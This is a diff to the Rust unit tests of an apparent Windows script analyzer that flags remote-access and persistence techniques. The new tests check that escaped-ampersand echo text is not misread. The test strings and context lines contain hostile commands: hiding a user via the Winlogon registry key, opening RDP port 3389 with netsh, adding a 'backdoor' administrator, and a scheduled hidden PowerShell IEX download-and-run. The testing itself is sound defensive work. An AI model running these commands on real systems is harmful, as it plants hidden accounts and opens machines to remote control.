@@ -4248,6 +4248,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn escaped_ampersand_hidden_user_text_does_not_emit_remote_access() {
+        let script = br#"echo keep ^& reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v defaultuserx /t REG_DWORD /d 0 /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "hidden-user" && target == "defaultuserx"
+            )),
+            "escaped ampersand echo text was misread as hidden-user setup: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_netsh_alias_emits_remote_access_trait() {
         let script = br#"copy C:\Windows\System32\netsh.exe C:\Users\Public\ns.tmp
 C:\Users\Public\ns.tmp advfirewall firewall add rule name="Remote Desktop" dir=in protocol=tcp localport=3389 action=allow
@@ -5494,6 +5510,22 @@ C:\Users\Public\nt.tmp localgroup Administrators backdoor /ADD
                     if technique == "rdp-firewall-open" && target == "3389"
             )),
             "netsh RDP firewall allow with reordered args was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_netsh_rdp_firewall_text_does_not_emit_remote_access() {
+        let script = br#"echo keep ^& netsh advfirewall firewall add rule name=rdp action=allow protocol=TCP localport=3389 dir=in"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "3389"
+            )),
+            "escaped ampersand echo text was misread as RDP firewall opening: {:?}",
             report.traits
         );
     }
